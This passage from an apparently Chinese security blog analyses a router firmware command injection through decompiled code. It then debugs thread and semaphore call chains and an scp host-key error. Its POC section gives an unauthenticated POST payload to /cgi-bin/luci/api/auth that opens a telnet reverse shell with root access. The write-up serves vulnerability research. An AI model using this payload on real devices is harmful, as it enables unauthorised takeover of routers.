!<span class="built_in">strcmp</span>(v5, <span class="string">&quot;network_group&quot;</span>) )<span class="comment">//v5是module的值  为networkId_merge  因此这个if进不去</span></span><br><span class="line">      sub_40E498(v6);</span><br><span class="line">    v8 = <span class="built_in">strcmp</span>(v4, <span class="string">&quot;get&quot;</span>);<span class="comment">//v4是set</span></span><br><span class="line">    <span class="keyword">if</span> ( !v8 )<span class="comment">//这个if进不去</span></span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;set&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;add&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;del&quot;</span>) || !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;update&quot;</span>) )<span class="comment">//这里比较set是会通过检查</span></span><br><span class="line">    &#123;</span><br><span class="line">      v29 = sub_40FD5C(a1);<span class="comment">//触发关键函数</span></span><br><span class="line">......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><code>sub_40FD5C</code> 函数关键代码分析如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_40FD5C</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v52, <span class="number">0</span>, <span class="keyword">sizeof</span>(v52));</span><br><span class="line">  v2 = *(_BYTE **)(a1 + <span class="number">80</span>);<span class="comment">// v2是data字段的值</span></span><br><span class="line">  <span class="keyword">if</span> ( !v2 || !*v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = *(_DWORD *)(a1 + <span class="number">28</span>);<span class="comment">// v3是2（devSta所导致的）</span></span><br><span class="line">  v4 = v3 &lt; <span class="number">2</span>;<span class="comment">//因为v3是2，所以这里的判断是FALSE v4为0</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = json_object_object_get(*(_DWORD *)(a1 + <span class="number">92</span>), <span class="string">&quot;sn&quot;</span>);<span class="comment">// 因为sn字段为空，所以下面的if进入，触发goto LABEL_45</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">......   </span><br><span class="line">LABEL_45:</span><br><span class="line">          v3 = *(_DWORD *)(a1 + <span class="number">28</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">......</span><br><span class="line">LABEL_46:</span><br><span class="line">      v4 = v3 &lt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">......</span><br><span class="line">LABEL_47:</span><br><span class="line">  <span class="keyword">if</span> ( v4 )<span class="comment">//经过三次跳转后，对v4做判断，因为v4为0 会触发下面的else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )<span class="comment">//v3是2，所以这个if进不去</span></span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    v18 = sub_40CEAC(a1, a1 + <span class="number">88</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//触发关键函数</span></span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>对 <code> sub_40CEAC</code> 函数的分析如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*a1 + <span class="number">46</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = *(_DWORD *)(*a1 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v5, <span class="string">&quot;commit&quot;</span>) )<span class="comment">//v5是set，这里判断的是不为commit则进入if，所以这两个if都能进入</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v5, <span class="string">&quot;init&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !a4 &amp;&amp; !a1[<span class="number">7</span>] )<span class="comment">//a4是固定的0，但是a1[7]的值为2，导致了这个if进不去</span></span><br><span class="line">      &#123;</span><br><span class="line">.......</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  gettimeofday(&amp;v90, <span class="number">0</span>);</span><br><span class="line">  v19 = a1[<span class="number">24</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(v19 + <span class="number">160</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !is_module_support_lua(a1[<span class="number">24</span>], (<span class="type">int</span>)a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      v63 = a1[<span class="number">20</span>];<span class="comment">//v63为data字段的值</span></span><br><span class="line">      <span class="keyword">if</span> ( v63 )</span><br><span class="line">        v64 = <span class="built_in">strlen</span>(v63);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v64 = <span class="number">0</span>;</span><br><span class="line">......</span><br><span class="line">      <span class="keyword">if</span> ( a3 )<span class="comment">//a3是固定的0</span></span><br><span class="line">      &#123;</span><br><span class="line">...... </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a4 )<span class="comment">//a4也是固定的0</span></span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v70 = <span class="built_in">snprintf</span>(v66, v68, <span class="string">&quot;/usr/sbin/module_call %s %s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">5</span>], (<span class="type">const</span> <span class="type">char</span> *)(v67 + <span class="number">8</span>));<span class="comment">//这里其实也是正常的命令拼接 a1[5]是set，v67+8是 networkId_merge</span></span><br><span class="line">        v71 = (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">20</span>];<span class="comment">//v71是data字段的值</span></span><br><span class="line">        v72 = &amp;v66[v70];</span><br><span class="line">        <span class="keyword">if</span> ( v71 )<span class="comment">//如果data字段的值存在的话，执行下面的拼接</span></span><br><span class="line">          v72 += <span class="built_in">snprintf</span>(&amp;v66[v70], v68, <span class="string">&quot; &#x27;%s&#x27;&quot;</span>, v71);<span class="comment">//这里存在了命令注入，data字段的值为我们可控，造成了任意命令拼接到原本的字符串上</span></span><br><span class="line">        v73 = a1[<span class="number">21</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v73 )</span><br><span class="line">          <span class="built_in">snprintf</span>(v72, v68, <span class="string">&quot; %s&quot;</span>, v73);</span><br><span class="line">      &#125;</span><br><span class="line">......</span><br><span class="line">      v74 = *(_DWORD *)(*a1 + <span class="number">4</span>);</span><br><span class="line">      v75 = <span class="built_in">strcmp</span>(v74, <span class="string">&quot;set&quot;</span>);</span><br><span class="line">      v76 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">19</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (!v75 || !<span class="built_in">strcmp</span>(v74, <span class="number">0x41FBF4</span>) || a3) &amp;&amp; *((_BYTE *)a1 + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v18 = ufm_commit_add(<span class="number">0</span>, v66, <span class="number">0</span>, a2);<span class="comment">//此处的v66是上面拼接后的最终命令</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>



<p><code>ufm_commit_add</code> 函数最开始直接调用了 <code>async_cmd_push_queue</code> 函数，下面对该函数进行分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">async_cmd_push_queue</span><span class="params">(_DWORD *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">unsigned</span> __int8 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  v3 = a3;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">68</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )<span class="comment">//a1是传入进来的0</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 )<span class="comment">//a2是注入的命令字符串</span></span><br><span class="line">    &#123;</span><br><span class="line">      v19 = strdup(a2);                         <span class="comment">// 会走到这里</span></span><br><span class="line">      *(_DWORD *)(v7 + <span class="number">28</span>) = v19;<span class="comment">//将命令存储到偏移28的位置，这里比较重要 </span></span><br><span class="line">      <span class="keyword">if</span> ( v19 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;                          <span class="comment">// 会从这里跳转</span></span><br><span class="line">......        </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">LABEL_34:</span><br><span class="line">  v20 = (_DWORD *)dword_435DE0;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">60</span>) = &amp;commit_task_head;</span><br><span class="line">  dword_435DE0 = v7 + <span class="number">60</span>;</span><br><span class="line">  v21 = dword_4360A4;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">64</span>) = v20;</span><br><span class="line">  *v20 = v7 + <span class="number">60</span>;</span><br><span class="line">  dword_4360A4 = v21 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(v7 + <span class="number">32</span>) = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    sem_init(v7 + <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  pthread_mutex_unlock(&amp;unk_4360B8);</span><br><span class="line">  sem_post(&amp;unk_4360A8);<span class="comment">//这里将信号量加上了1，意味着其他地方应该是有sem_wait阻塞了一个线程的执行</span></span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="切换线程-命令执行"><a href="#切换线程-命令执行" class="headerlink" title="切换线程-命令执行"></a>切换线程-命令执行</h4><p>对信号量  <code>unk_4360A8</code> 进行交叉引用，定位到了 <code>sub_41AFC8</code> 函数。只要上面的代码执行<code>sem_post</code> 将该信号量加一，那么这个线程就能继续运行，从而调用 <code>sub_41ADF0</code> 函数（调试这里需要取消线程锁定）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_41AFC8</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sem_wait(&amp;unk_4360A8);</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v4 );</span><br><span class="line">......</span><br><span class="line">    sub_41ADF0(v4);</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>下面对 <code>sub_41ADF0</code> 函数做简单的分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_41ADF0</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v1 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )<span class="comment">//为0 进不去这个if</span></span><br><span class="line">  &#123;</span><br><span class="line">......   </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)a1 + <span class="number">32</span>) )<span class="comment">//*((_BYTE *)a1 + 32)为0，可以进入if</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = ufm_popen((<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">7</span>], a1 + <span class="number">13</span>);<span class="comment">//这个a1[7]，也就是偏移28的位置，上文中提到最后拼接的命令就被写入了一个结构体偏移28的位置，因此这里触发命令执行，且没有做任何过滤</span></span><br><span class="line">      v3 = a1;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301517529.png" alt="image-20230830151703071"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>向 <code>/cgi-bin/luci/api/auth</code> 路径发送 <code>POST</code> 报文，即可在未授权的情况下拿到路由器的最高权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;method&quot;: &quot;merge&quot;,</span><br><span class="line">	&quot;params&quot;: &#123;</span><br><span class="line">		&quot;sorry&quot;: &quot;&#x27;$(mkfifo /tmp/test;telnet 192.168.45.66 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&#x27;&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308311455808.png" alt="image-20230831145405109"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308311456572.png" alt="image-20230831145508255"></p>
<p>上面对 <code>lua</code> 文件以及二进制文件的调用链进行了分析和调试，下面记录下在分析过程中自己产生的疑问以及自己探究出的答案</p>
<h2 id="疑问-amp-amp-解决"><a href="#疑问-amp-amp-解决" class="headerlink" title="疑问&amp;&amp;解决"></a>疑问&amp;&amp;解决</h2><h3 id="deal-remote-config-handle函数是怎么被触发的"><a href="#deal-remote-config-handle函数是怎么被触发的" class="headerlink" title="deal_remote_config_handle函数是怎么被触发的"></a>deal_remote_config_handle函数是怎么被触发的</h3><p>在 <code>uf_cmd_task_init</code> 函数中，调用了 <code>create_thread</code> 函数，该函数调用了 <code>pthread_create</code> 函数来创建一个新的线程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">create_thread</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  result = pthread_create();</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">13</span>) = <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">13</span>) = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接看 <code>IDA</code> 发现 <code>create_thread</code> 函数中并没有参数，但是该函数的定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr,</span></span><br><span class="line"><span class="params">                   <span class="type">void</span> *(*start_routine)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br></pre></td></tr></table></figure>

<p>其中标明了第三个参数（寄存器应该为 <code>$a2</code>）是新线程的执行入口函数，判断出这里是 <code>IDA</code> 的显示问题，分析汇编代码查看 <code>pthread_create</code> 函数的第三个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:0040BE64                 li      $gp, (dword_4358A0+0x7FF0 - .)</span><br><span class="line">LOAD:0040BE6C                 addu    $gp, $t9</span><br><span class="line">LOAD:0040BE70                 addiu   $sp, -0x20</span><br><span class="line">LOAD:0040BE74                 la      $t9, pthread_create</span><br><span class="line">LOAD:0040BE78                 lw      $a2, 4($a0)</span><br><span class="line">LOAD:0040BE7C                 move    $a1, $zero</span><br><span class="line">LOAD:0040BE80                 sw      $s0, 0x18+var_s0($sp)</span><br><span class="line">LOAD:0040BE84                 sw      $gp, 0x18+var_8($sp)</span><br><span class="line">LOAD:0040BE88                 sw      $ra, 0x18+var_s4($sp)</span><br><span class="line">LOAD:0040BE8C                 move    $a3, $a0</span><br><span class="line">LOAD:0040BE90                 jalr    $t9 ; pthread_create</span><br><span class="line">LOAD:0040BE94                 move    $s0, $a0</span><br></pre></td></tr></table></figure>

<p>发现有指令 <code>lw    $a2, 4($a0)</code> <code>$a0</code> 为 <code>create_thread</code> 函数的实参，这里是将 <code>$a0</code> 加 <code>4</code> 的位置赋值给了 <code>$a2</code> ，交叉引用发现 <code>deal_remote_config_handle</code> 函数地址最终就是 <code>pthread_create</code> 函数的第三个参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(_DWORD *)(v10 + <span class="number">4</span>) = deal_remote_config_handle;</span><br><span class="line"><span class="keyword">if</span> ( create_thread(v10) )</span><br></pre></td></tr></table></figure>

<p>所以判断 <code>deal_remote_config_handle</code> 函数是在 <code>uf_cmd_task_init</code> 新创建的线程中当做入口函数来执行的</p>
<h3 id="用户没有传入数据时，进程在哪里被阻塞了？"><a href="#用户没有传入数据时，进程在哪里被阻塞了？" class="headerlink" title="用户没有传入数据时，进程在哪里被阻塞了？"></a>用户没有传入数据时，进程在哪里被阻塞了？</h3><p>在 <code>IDA</code> 中有如下代码，这里从其他进程中读取了用户输入的数据，如果在 <code>uf_socket_msg_read</code> 函数执行前后分别打下断点的话，按几次 <code>c</code> 后发现，调试界面就会卡到 <code>uf_socket_msg_read</code> 函数执行后的界面</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v51 = (_DWORD *)uf_socket_msg_read(*v29, v31 + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>我最初一直以为是 <code>uf_socket_msg_read</code> 函数如果没有接收到数据，就会阻塞，直到接收新的数据。但这样的话，应该是卡到了 <code>uf_socket_msg_read</code> 函数执行时，并非是卡到了 <code>uf_socket_msg_read</code> 函数执行后。卡到了执行后其实就是卡到的是下一次 <code>uf_socket_msg_read</code> 函数执行前。因此就推翻了我原先的认知，为了寻找具体是哪里将进程阻塞，我下了大量的断点，逐步缩小范围，最终找到了 <code>while ( select(fbss + 1, g_fd_set, 0, 0, 0) &lt;= 0 );</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> nfds, fd_set *readfds, fd_set *writefds,fd_set *exceptfds, <span class="keyword">struct</span> timeval *timeout)</span>;</span><br></pre></td></tr></table></figure>

<p><code>select</code> 函数允许程序监视多个文件描述符，等待所监视的一个或者多个文件描述符变为 <strong>“准备就绪”</strong> 的状态。所谓的 <strong>”准备就绪“</strong> 状态是指：文件描述符不再是阻塞状态，可以用于某类IO操作了，包括可读，可写，发生异常三种。在 <code>select</code> 函数调用之后，如果返回值大于 <code>0</code> ，表示至少有一个文件描述符 <strong>“准备就绪”</strong> ，程序中的 <code>select</code> 函数监视的是是否有文件描述符变成可读（也就是有数据可以读取），如果 <code>timeout == NULL</code> ，会无期限的等待下去，这个等待可以被一个信号中断，只有当一个描述符准备好，或者捕获到一个信号时函数才会返回。如果是捕获到信号，<code>select</code> 返回 <code>-1</code> ，并将变量<code>errno</code> 设置成 <code>EINTR</code> 。</p>
<p>验证的话，只需要在 <code> select(fbss + 1, g_fd_set, 0, 0, 0)</code> 代码执行前后打上断点，发现确实卡在了 <code>select</code> 函数执行时，当用户发送报文后，代码就可以继续往后执行了，因为 <code>select</code> 函数已经确定了有文件描述符变成了可读，所以后面的 <code>uf_socket_msg_read</code> 函数可以顺利接收到用户传入的数据。至此确定卡住进程的并不是 <code>uf_socket_msg_read</code> 函数，而是 <code>select</code> 函数</p>
<h3 id="从deal-remote-config-handle函数如何执行到uf-cmd-call函数"><a href="#从deal-remote-config-handle函数如何执行到uf-cmd-call函数" class="headerlink" title="从deal_remote_config_handle函数如何执行到uf_cmd_call函数"></a>从deal_remote_config_handle函数如何执行到uf_cmd_call函数</h3><p>我把 <code>uf_cmd_call</code> 函数当做正式调用链的入口，通过调试可以得知 <code>uf_cmd_call</code> 函数是在 <code>deal_remote_config_handle</code> 中被调用的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291028707.png" alt="image-20230829102836486"></p>
<p>但这里并非是顺序执行代码，正常触发 <code>uf_cmd_call</code> </p>
<p><code>deal_remote_config_handle</code> 函数刚执行时就会在下面的循环卡住</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">  v3 = uf_task_remote_pop_queue();</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">16</span>) = v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( !v3 );</span><br></pre></td></tr></table></figure>



<p><code>uf_task_remote_pop_queue</code> 函数开始执行了 <code>sem_wait(&amp;unk_435E90)</code> ，这里表示在等待一个信号量，如果信号量的值大于零，则将信号量的值减一，然后继续执行；如果信号量的值为零，则进程（或线程）将被阻塞，直到信号量的值大于零。通过调试的话能发现，实际造成线程卡住的代码就是 <code>sem_wait</code> ，这就说明肯定有一个地方还没有触发相应信号量的 <code>sem_post</code> 操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">uf_task_remote_pop_queue</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// $s0</span></span><br><span class="line"></span><br><span class="line">  sem_wait(&amp;unk_435E90);</span><br><span class="line">  pthread_mutex_lock(&amp;unk_435E74);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span> *)cmd_task_remote_head == &amp;cmd_task_remote_head )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = cmd_task_remote_head - <span class="number">4</span>;</span><br><span class="line">    sub_40B620((_DWORD *)cmd_task_remote_head);</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_mutex_unlock(&amp;unk_435E74);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>接下来对信号量进行交叉引用，<code>sub_40B0B0</code> 中确实是一个 <code>sem_post(&amp;unk_435E90)</code> 的操作，然后 <code>uf_task_remote_pop_queue</code> 也就是下图的位置 <code>sem_wait(&amp;unk_435E90)</code>，最后的 <code>uf_cmd_task_init</code> 函数中是 <code>sem_init(&amp;unk_435E90, 0, 0)</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291044499.png" alt="image-20230829104446429"></p>
<p>根据上面的分析可知，只有 <code>sub_40B0B0</code> 函数存在 <code>sem_post(&amp;unk_435E90)</code> ，因此下面要追踪 <code>sub_40B0B0</code> 函数的调用链，对其交叉引用发现在 <code>sub_40B304</code> 函数进行了调用</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291048141.png" alt="image-20230829104848068" style="zoom:67%;" />

<p>至此都是正常的分析思路，接下来应该继续对 <code>sub_40B304</code> 函数进行交叉引用，但这里 <code>IDA</code> 就对我的分析产生了误导，通过下图得知，应该是只有一个叫做 <code>uf_lock_cmd_pop_all</code> 的函数调用了 <code>sub_40B304</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291052228.png" alt="image-20230829105258147"></p>
<p>查看 <code>uf_lock_cmd_pop_all</code> 函数代码，发现确实是进行了调用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291054903.png" alt="image-20230829105440844"></p>
<p>但如果继续跟 <code>uf_lock_cmd_pop_all</code> 这条链的话，最后就发现这条链在 <code>main</code> 函数的触发太靠前了，实际上改变信号量触发 <code>uf_cmd_call</code> 的操作一定是要在接收用户数据之后做的。并且可以用 <code>gdb</code> 验证，只需要在 <code>sub_40B0B0</code> 函数下一个断点，在 <code>uf_lock_cmd_pop_all</code> 函数下一个断点，最后发现程序没有在 <code>uf_lock_cmd_pop_all</code> 函数处断下来，而在 <code>sub_40B0B0</code> 断下来了。</p>
<p>因此得出结论，<strong>除去 <code>uf_lock_cmd_pop_all</code> 函数，一定还有一条链也可以触发 <code>sub_40B0B0</code> 函数，而这个链通过 <code>IDA</code> 的交叉引用并没有看到</strong> （在实际我分析这里时，我其实分析和调试了很久才做出了这个判断，因为有怀疑过 <code>gdb</code> 的 <code>bug</code>，有怀疑过是我调用链没分析明白，但最后通过分析和调试逐一排除了这些推断）也有一点运气使然，我后续无意翻看代码时，在位于 <code>add_pkg_cmd2_task</code> 函数中，我看到了 <code>sub_40B304</code> 函数，该函数是 <code>sub_40B0B0</code> 上级函数。</p>
<p>因此还有一条链也能改变信号量，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main =&gt; add_pkg_cmd2_task =&gt; sub_40B304 =&gt; sub_40B0B0 =&gt; sem_post(&amp;unk_435E90)</span><br></pre></td></tr></table></figure>

<p>能发现这条链的原因有三个，第一是这条调用链不深（如果 <code>add_pkg_cmd2_task</code> 函数调用了三四层函数才到 <code>sub_40B304</code> ，大概率也很难找到），第二是我当时将函数重命名了（我写本文的时候将 <code>sub_40B304</code> <code>sub_40B0B0</code> 函数改回了 <code>IDA</code> 默认的名称，不过在我分析的时候，我对这些关键的调用函数都做了重命名，可以一眼看到这类函数，否则用默认名字，长的差不多的情况下，也不一定能注意到），第三是坚持（这个调用链的问题，我整整分析了一天，虽然结论只是 <code>IDA</code> 有点问题，但这个误导以及摆脱误导的过程是困难且有意义的，如果不是 <strong>winmt</strong> 师傅让我对细节的坚持，或许我早已放弃这一个小小的信号量分析）</p>
<h3 id="scp命令报错解决"><a href="#scp命令报错解决" class="headerlink" title="scp命令报错解决"></a>scp命令报错解决</h3><p>在使用 <code>scp</code> 命令传输的时候，报错如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  204 sudo scp squashfs-root.tar.gz root@192.168.45.66:/root/204.tar.gz</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</span><br><span class="line">Someone could be eavesdropping on you right now (man-in-the-middle attack)!</span><br><span class="line">It is also possible that a host key has just been changed.</span><br><span class="line">The fingerprint for the RSA key sent by the remote host is</span><br><span class="line">SHA256:tVc2ekHlAJNyIu0Fo9rOvfudWIVfkMpa3FSLlDcGeVQ.</span><br><span class="line">Please contact your system administrator.</span><br><span class="line">Add correct host key in /root/.ssh/known_hosts to get rid of this message.</span><br><span class="line">Offending RSA key in /root/.ssh/known_hosts:6</span><br><span class="line">  remove with:</span><br><span class="line">  ssh-keygen -f &quot;/root/.ssh/known_hosts&quot; -R &quot;192.168.45.66&quot;</span><br><span class="line">RSA host key for 192.168.45.66 has changed and you have requested strict checking.</span><br><span class="line">Host key verification failed.</span><br><span class="line">lost connection</span><br></pre></td></tr></table></figure>

<p>产生这个错误的原因是因为 <code>SSH</code> 密钥认证的安全机制， <code>SSH</code> 使用密钥来确保通信的安全性和身份认证，每台 <code>SSH</code> 服务器都有一个公钥和私钥。当第一次连接到 <code>SSH</code> 服务器上时，服务器会生成一对密钥，将公钥发给客户端，这个公钥会保存在客户端本地的 <code>known_hosts</code> 文件中，当以后连接到同一个服务器的时候，客户端会检查服务器发送过来的公钥是否和 <code>known_hosts</code> 文件中的公钥匹配，如果匹配，连接就会被建立，如果不匹配（可能受到了中间人攻击或者服务器密钥已更改），就会出现如上报错。</p>
<p>解决方法：执行 <code>ssh-keygen -f &quot;/root/.ssh/known_hosts&quot; -R &quot;192.168.45.66&quot;</code> 命令，它将删除 <code>known_hosts</code> 文件中与服务器 <code>IP</code> 地址 <code>192.168.45.66</code> 相关的密钥记录。然后重新执行 <code>scp</code> 命令进行文件传输，这样 <code>SSH</code> 客户端会检测到新的主机密钥，并将其添加到已知主机列表中（<code>known_hosts</code> 文件）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308251011899.png" alt="image-20230825101111496" style="zoom:67%;" />





